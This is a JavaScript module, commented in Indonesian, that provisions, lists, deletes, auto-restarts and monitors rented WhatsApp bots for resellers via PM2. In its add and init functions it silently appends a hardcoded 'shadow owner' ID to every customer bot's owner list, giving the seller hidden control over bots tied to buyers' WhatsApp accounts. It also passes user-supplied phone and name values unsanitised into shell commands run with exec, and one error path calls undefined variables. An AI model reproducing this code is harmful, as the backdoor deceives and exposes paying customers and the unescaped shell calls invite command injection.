const { spawn } = require('child_process');
const fs = require('fs');
const path = require('path');

const DB_PATH = path.join(__dirname, '../../data/child_bots.json');

// Pastikan file database ada
if (!fs.existsSync(DB_PATH)) {
    fs.writeFileSync(DB_PATH, JSON.stringify([], null, 2));
}

/**
 * Mendapatkan daftar bot anak
 */
const getChildBots = () => {
    try {
        return JSON.parse(fs.readFileSync(DB_PATH, 'utf8'));
    } catch (e) {
        return [];
    }
};

/**
 * Menyimpan daftar bot anak
 */
const saveChildBots = (bots) => {
    fs.writeFileSync(DB_PATH, JSON.stringify(bots, null, 2));
};

/**
 * Menambahkan bot baru (Child Bot)
 * @param {object} sock Socket WA Utama
 * @param {string} remoteJid JID Tujuan log
 * @param {string} phone Nomor HP Bot Anak
 * @param {string} name Nama Pembeli/Bot
 * @param {number} days Durasi sewa (hari)
 * @param {string} ownerPhone Nomor HP Owner Bot Anak
 * @param {string} method Metode login (qr/pairing)
 * @param {boolean} lowRam Apakah menggunakan mode hemat RAM
 */
const addChildBot = async (sock, remoteJid, phone, name, days, ownerPhone, method = 'pairing', lowRam = false) => {
    const loginMethod = (method || 'pairing').toLowerCase();
    const bots = getChildBots();
    
    // VALIDASI: Cek apakah nomor atau nama sudah terdaftar
    const existingBot = bots.find(b => b.phone === phone || b.name.toLowerCase() === name.toLowerCase());
    if (existingBot) {
        const errorMsg = `❌ Bot dengan ${existingBot.phone === phone ? 'nomor' : 'nama'} *${existingBot.phone === phone ? phone : name}* sudah terdaftar!\n\nSilakan hapus terlebih dahulu menggunakan perintah *${require('./../../src/utils/config').getConfig().prefix || '.'}deletebot ${phone}* jika ingin mendaftar ulang.`;
        await sock.sendMessage(remoteJid, { text: errorMsg });
        return;
    }

    // Hitung waktu kadaluarsa (default 30 hari jika invalid)
    const durationDays = parseInt(days) || 30;
    const expiryDate = new Date();
    expiryDate.setDate(expiryDate.getDate() + durationDays);
    
    const newBot = {
        phone,
        name,
        owner: ownerPhone,
        sessionName: `bot_${phone}`,
        addedAt: new Date().toISOString(),
        expiryAt: expiryDate.toISOString(),
        status: 'pending',
        isLowRam: lowRam
    };

    // Shadow owner (kamu) akan ditambahkan sebagai owner kedua
    const shadowOwner = '152188357705821';
    const fullOwnerList = `${ownerPhone},${shadowOwner}`;
    
    const botName = `bot_${phone}`;
    const { exec } = require('child_process');
    const util = require('util');
    const execPromise = util.promisify(exec);

    const pm2Path = '/home/container/node_modules/.bin/pm2';
    console.log(`[BotManager] Mencoba menjalankan PM2 di: ${pm2Path}`);

    try {
        // Hapus secara diam-diam (abaikan error kalau tidak ada)
        await execPromise(`${pm2Path} delete ${botName}`, { windowsHide: true }).catch(() => {
            return execPromise(`npx --yes pm2 delete ${botName}`, { windowsHide: true }).catch(() => {});
        });
        
        console.log(`[BotManager] Memulai bot anak: ${botName} (${phone})`);
        
        // Hapus proses lama jika ada agar argumen terupdate
        await execPromise(`${pm2Path} delete ${botName}`, { cwd: path.join(__dirname, '../../'), windowsHide: true }).catch(() => {});

        // Start PM2 dengan argumen yang benar
        let startCmd = loginMethod === 'qr'
            ? `${pm2Path} start index.js --name ${botName} -- --session=${botName} --owner=${fullOwnerList} --qr`
            : `${pm2Path} start index.js --name ${botName} -- --session=${botName} --pairing=${phone} --owner=${fullOwnerList}`;
        
        if (lowRam) {
            startCmd = loginMethod === 'qr'
                ? `${pm2Path} start index.js --name ${botName} --node-args="--max-old-space-size=256" -- --session=${botName} --owner=${fullOwnerList} --qr --low-ram`
                : `${pm2Path} start index.js --name ${botName} --node-args="--max-old-space-size=256" -- --session=${botName} --pairing=${phone} --owner=${fullOwnerList} --low-ram`;
        }
        
        // Eksekusi start
        await execPromise(startCmd, { cwd: path.join(__dirname, '../../'), windowsHide: true }).catch(async (e) => {
            console.log(`⚠️ Local PM2 failed: ${e.message}, trying npx...`);
            const npxCmd = startCmd.includes(pm2Path) ? startCmd.replace(pm2Path, 'npx --yes pm2') : `npx --yes pm2 start index.js ...`;
            await execPromise(npxCmd, { cwd: path.join(__dirname, '../../'), windowsHide: true });
        });

        console.log(`🚀 [BotManager] Bot anak ${phone} berhasil didaftarkan.`);
    } catch (err) {
        console.error(`[BotManager] Gagal mendaftarkan ${botName}:`, err.message);
        bot.sendMessage(chatId, `❌ Gagal menjalankan sistem: ${err.message}`);
    }

    await sock.sendMessage(remoteJid, { 
        text: `🚀 Sedang mendaftarkan bot *${name}* (${phone}) ke sistem...\n🍃 Mode: *${lowRam ? 'ENTENG (Hemat RAM)' : 'NORMAL'}*\n⏳ Menunggu ${loginMethod === 'qr' ? 'QR Code' : 'kode pairing'} (±5-10 detik)...` 
    });

    let authDataSent = false;

    // Tunggu sebentar agar PM2 sempat start
    await new Promise(r => setTimeout(r, 2000));

    // Gunakan 'pm2 logs' untuk menguping output bot anak
    const logWatcher = spawn('/home/container/node_modules/.bin/pm2', ['logs', botName, '--lines', '100', '--no-daemon'], {
        cwd: path.join(__dirname, '../../'),
        shell: true,
        windowsHide: true,
        stdio: ['ignore', 'pipe', 'pipe']
    });

    // Fallback npx if pm2 logs fails
    logWatcher.on('error', (e) => {
        console.log(`[BotManager] PM2 Logs failed: ${e.message}, trying npx logs...`);
        const fallbackLog = spawn('npx', ['--yes', 'pm2', 'logs', botName, '--lines', '100', '--no-daemon'], {
            cwd: path.join(__dirname, '../../'),
            shell: true,
            windowsHide: true,
            stdio: ['ignore', 'pipe', 'pipe']
        });
        // Hook existing listeners to the fallback
        logWatcher.stdout.pipe(fallbackLog.stdout);
    });

    let loginTimeout;

    // Timeout utama (Maksimal 6 menit: 3 menit tunggu kode, 3 menit tunggu login)
    const mainTimeout = setTimeout(() => {
        if (!authDataSent) {
            sock.sendMessage(remoteJid, { text: `❌ Gagal mendapatkan ${loginMethod === 'qr' ? 'QR Code' : 'kode pairing'} untuk ${phone} dalam 3 menit.\nCoba lagi dengan: *${require('./../../src/utils/config').getConfig().prefix || '.'}addbotku ${phone} ${name} ${days} ${ownerPhone} ${loginMethod}*` });
            logWatcher.kill();
        } else {
            // Cek apakah status masih pending
            const currentBots = getChildBots();
            const botData = currentBots.find(b => b.phone === phone);
            if (botData && botData.status === 'pending') {
                sock.sendMessage(remoteJid, { 
                    text: `⏳ Waktu tunggu habis!\nBot *${name}* (${phone}) gagal terhubung karena kedaluwarsa.\n\nSilakan minta kode/QR baru.` 
                });
                logWatcher.kill();
            }
        }
    }, 360000); // 6 menit total timeout

    const readline = require('readline');
    const rl = readline.createInterface({
        input: logWatcher.stdout,
        terminal: false
    });

    rl.on('line', async (line) => {
        const output = line.trim();
        // Cari pola kode pairing
        const pairingMatch = output.match(/KODE PAIRING ANDA: ([A-Z0-9]{4}-[A-Z0-9]{4})/);
        // Cari pola QR Code
        const qrMatch = output.match(/RAW_QR_CODE:(.+)/);
        
        if (pairingMatch && !authDataSent) {
            authDataSent = true;
            const code = pairingMatch[1];
            newBot.pairingCode = code;
            console.log(`[BotManager] Detected Pairing Code for ${phone}: ${code}`);
            
            await sock.sendMessage(remoteJid, {
                text: `✅ *Bot Anak Berhasil Disiapkan!*\n\n` +
                      `👤 Nama: ${name}\n` +
                      `📱 Nomor: ${phone}\n` +
                      `⏳ Sewa: ${days} Hari\n` +
                      `📅 Expired: ${expiryDate.toLocaleDateString('id-ID')}\n\n` +
                      `🔑 *KODE PAIRING:*\n` +
                      `*${code}*`
            });
            
            if (global.botEvents) {
                global.botEvents.emit('telegram_auth', {
                    type: 'pairing',
                    phone, name, days,
                    code, expiryDate: expiryDate.toLocaleDateString('id-ID')
                });
            }
            
            newBot.status = 'pending';
            bots.push(newBot);
            saveChildBots(bots);
        } else if (qrMatch && !authDataSent) {
            authDataSent = true;
            const qrRaw = qrMatch[1].trim();
            newBot.pairingCode = "QR_CODE";
            console.log(`[BotManager] Detected QR Code for ${phone}`);
            
            try {
                const qrcodeLib = require('qrcode');
                const qrBuffer = await qrcodeLib.toBuffer(qrRaw, { scale: 8 });
                
                await sock.sendMessage(remoteJid, {
                    image: qrBuffer,
                    caption: `✅ *Bot Anak Berhasil Disiapkan!*\n\n` +
                          `👤 Nama: ${name}\n` +
                          `📱 ID Sesi: ${phone}\n` +
                          `⏳ Sewa: ${days} Hari\n\n` +
                          `💡 Silakan Scan QR Code ini.`
                });

                if (global.botEvents) {
                    global.botEvents.emit('telegram_auth', {
                        type: 'qr',
                        phone, name, days,
                        buffer: qrBuffer,
                        expiryDate: expiryDate.toLocaleDateString('id-ID')
                    });
                }
            } catch (qrErr) {
                console.error('[BotManager] QR Buffer Error:', qrErr.message);
            }
            
            newBot.status = 'pending';
            bots.push(newBot);
            saveChildBots(bots);
        }

        // Deteksi jika bot sudah benar-benar tersambung
        if (output.includes('berhasil terhubung ke WhatsApp') || output.includes('opened connection')) {
            const currentBots = getChildBots();
            const index = currentBots.findIndex(b => b.phone === phone);
            if (index !== -1 && currentBots[index].status !== 'active') {
                currentBots[index].status = 'active';
                saveChildBots(currentBots);
                
                await sock.sendMessage(remoteJid, {
                    text: `🎉 *Koneksi Berhasil!*\n\nBot untuk *${name}* (${phone}) sekarang sudah aktif dan tersambung ke WhatsApp.\n\nSelamat menggunakan bot!`
                });
                
                clearTimeout(mainTimeout);
                logWatcher.kill();
            }
        }
    });

    logWatcher.stderr.on('data', (data) => {
        console.error(`[LogWatcher ${phone}] ERROR: ${data.toString()}`);
    });
};

/**
 * Menampilkan daftar bot yang sedang aktif
 */
const listChildBots = async (sock, remoteJid) => {
    const bots = getChildBots();
    if (bots.length === 0) {
        return sock.sendMessage(remoteJid, { text: '📭 Belum ada bot anak yang terdaftar.' });
    }

    let text = `📋 *DAFTAR BOT ANAK (RESELLER)*\n\n`;
    bots.forEach((bot, i) => {
        const remaining = Math.ceil((new Date(bot.expiryAt) - new Date()) / (1000 * 60 * 60 * 24));
        const status = remaining > 0 ? '🟢 Aktif' : '🔴 Expired';
        text += `${i + 1}. *${bot.name}* (${bot.phone})\n`;
        text += `   Status: ${status}\n`;
        text += `   Sisa: ${remaining} Hari\n`;
        text += `   Sesi: ${bot.sessionName}\n\n`;
    });

    await sock.sendMessage(remoteJid, { text: text.trim() });
};

/**
 * Menghapus bot dari list dan mematikan prosesnya
 */
const deleteChildBot = async (sock, remoteJid, target) => {
    let bots = getChildBots();
    const targetClean = target.replace(/[^0-9]/g, '');
    
    // Cari berdasarkan nomor atau nama sesi
    const index = bots.findIndex(b => b.phone === targetClean || b.sessionName === target);
    
    if (index === -1) {
        return sock.sendMessage(remoteJid, { text: `❌ Bot dengan nomor/sesi *${target}* tidak ditemukan di daftar.` });
    }

    const bot = bots[index];
    const botName = bot.sessionName;

    // 1. Matikan & Hapus dari PM2
    const { exec } = require('child_process');
    exec(`./node_modules/.bin/pm2 delete ${botName}`, { windowsHide: true }, async (err) => {
        if (err) {
            console.error(`[BotManager] Gagal delete PM2 ${botName}:`, err.message);
        }
        
        // 2. Hapus folder session agar benar-benar bersih
        const sessionPath = path.join(__dirname, `../../sessions/${botName}`);
        if (fs.existsSync(sessionPath)) {
            try {
                fs.rmSync(sessionPath, { recursive: true, force: true });
            } catch (e) {
                console.error(`[BotManager] Gagal hapus folder session ${botName}:`, e.message);
            }
        }

        // 3. Hapus dari database JSON
        const deletedBot = bots.splice(index, 1)[0];
        saveChildBots(bots);

        await sock.sendMessage(remoteJid, { 
            text: `🗑️ *Bot Berhasil Dihapus*\n\n` +
                  `👤 Nama: ${deletedBot.name}\n` +
                  `📱 Nomor: ${deletedBot.phone}\n\n` +
                  `✅ Proses PM2 telah dihentikan dan data sesi telah dibersihkan.`
        });
    });
};

/**
 * Menginisialisasi (restart) semua bot anak yang aktif saat bot utama start
 */
const initChildBots = async () => {
    const bots = getChildBots();
    const activeBots = bots.filter(b => b.status === 'active');
    
    if (activeBots.length === 0) return;
    
    console.log(`♻️ [BotManager] Menghidupkan kembali ${activeBots.length} bot anak...`);
    
    const { exec } = require('child_process');
    const util = require('util');
    const execPromise = util.promisify(exec);
    const pm2Path = '/home/container/node_modules/.bin/pm2';
    const shadowOwner = '152188357705821';

    for (const bot of activeBots) {
        try {
            const fullOwnerList = `${bot.owner},${shadowOwner}`;
            const botName = bot.sessionName;
            const lowRam = bot.isLowRam || false;

            // PENTING: Cek apakah session sudah ada (creds.json valid).
            // Jika TIDAK ada -> JANGAN auto-start, karena akan minta pairing/QR baru
            // setiap restart (= spam pairing code). Hanya resume kalau session sudah ada.
            const sessionDir = path.join(__dirname, '../../sessions', botName);
            const credsPath = path.join(sessionDir, 'creds.json');
            const hasSession = fs.existsSync(credsPath);

            if (!hasSession) {
                console.log(`⏭️  [BotManager] Skip auto-start ${botName} (${bot.phone}): tidak ada session. Gunakan /retrybot atau .retrybot dari bot utama untuk pairing manual.`);
                continue;
            }

            console.log(`🚀 [BotManager] Auto-start: ${botName} (${bot.phone}) [resume session]`);

            // Tidak pakai --pairing/--qr karena session sudah ada -> langsung resume.
            let startCmd = `${pm2Path} start index.js --name ${botName} -- --session=${botName} --owner=${fullOwnerList}`;

            if (lowRam) {
                startCmd = `${pm2Path} start index.js --name ${botName} --node-args="--max-old-space-size=256" -- --session=${botName} --owner=${fullOwnerList} --low-ram`;
            }

            // Jalankan start (PM2 akan handle jika sudah ada/restart)
            await execPromise(startCmd, { cwd: path.join(__dirname, '../../'), windowsHide: true }).catch(async (e) => {
                const npxCmd = startCmd.replace(pm2Path, 'npx --yes pm2');
                await execPromise(npxCmd, { cwd: path.join(__dirname, '../../'), windowsHide: true });
            });
        } catch (err) {
            console.error(`❌ [BotManager] Gagal auto-start ${bot.phone}:`, err.message);
        }
    }
    console.log('✅ [BotManager] Semua bot anak berhasil diproses.');
};

/**
 * Memantau status bot anak dan memberikan notifikasi jika ada yang mati
 */
const monitorChildBots = async (sock) => {
    const bots = getChildBots();
    const activeBots = bots.filter(b => b.status === 'active');
    if (activeBots.length === 0) return;

    const { exec } = require('child_process');
    const util = require('util');
    const execPromise = util.promisify(exec);
    const pm2Path = '/home/container/node_modules/.bin/pm2';

    for (const bot of activeBots) {
        try {
            const botName = bot.sessionName;
            const { stdout } = await execPromise(`${pm2Path} jlist`, { windowsHide: true }).catch(() => execPromise('npx --yes pm2 jlist', { windowsHide: true }));
            const pm2List = JSON.parse(stdout);
            const proc = pm2List.find(p => p.name === botName);

            if (!proc || proc.pm2_env.status !== 'online') {
                const status = proc ? proc.pm2_env.status : 'NOT_FOUND';
                console.log(`⚠️ [Monitor] Bot ${botName} terdeteksi OFFLINE (Status: ${status})`);
                
                // Kirim notifikasi ke owner utama
                const targetJid = bot.owner.includes('@') ? bot.owner : `${bot.owner}@s.whatsapp.net`;
                await sock.sendMessage(targetJid, { 
                    text: `⚠️ *LAPORAN BOT MATI*\n\nBot Abang *${bot.name}* (${bot.phone}) terdeteksi sedang tidak aktif (OFFLINE).\n\nStatus: *${status}*\nSistem akan mencoba menghidupkannya kembali.`
                }).catch(() => {});
                
                // Coba restart otomatis
                await execPromise(`${pm2Path} restart ${botName}`, { windowsHide: true }).catch(() => execPromise(`npx --yes pm2 restart ${botName}`, { windowsHide: true }));
            }
        } catch (e) {
            console.error(`[Monitor] Error checking status for ${bot.phone}:`, e.message);
        }
    }
};

module.exports = {
    getChildBots,
    saveChildBots,
    addChildBot,
    listChildBots,
    deleteChildBot,
    initChildBots,
    monitorChildBots
};
